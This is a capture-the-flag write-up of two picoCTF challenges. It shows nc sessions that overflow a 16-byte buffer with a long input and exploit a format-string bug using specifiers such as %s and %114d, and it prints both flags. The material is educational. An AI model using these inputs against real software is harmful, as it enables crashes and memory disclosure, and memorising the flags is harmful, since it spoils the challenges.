# Challenge 1: buffer overflow 0
Challenge is asking to exploit the code by overflowing the buffer in the given C source file.

## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## My Approach:
First I started with entering a normal input, on entering the program gets ended. Them I checked the C source code provided to us, there I saw that buffer char array's maximum size is 16. Therefore, to overflow, input should be of greater size than the size of the array.

```
krishna@ULTRON:~$ nc saturn.picoctf.net 53582
Input: 123
The program will exit now

krishna@ULTRON:~$ nc saturn.picoctf.net 53582
Input: 0000000000000000
The program will exit now

krishna@ULTRON:~$
krishna@ULTRON:~$ nc saturn.picoctf.net 53582
Input: 0000000000000000000000000000000000000000
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## My Learnings:
Got to know about stack overflows.


# Challenge 2: format string 0
The challenge says to use the knowledge of manipulating strings in the program to solve it and get the flag.

## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## My Approach:
As the challenge says, formatting of strings required to solve the challenge, I directly went for the  format specifiers as it is the C source code. We have to print that the first customer is happy and now you can serve to next customer. So, I edited the print statement to customer is happy and changed the format specifier to int one for the next print statement. I did same for the last print statement too i.e. changed the format specifier and then connected the C source file to the terminal and extracted the flag.

```
 nc mimas.picoctf.net 63049
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## My Learnings:
Applied some known knowledge into the challenge about format specifiers and extracted the flag.


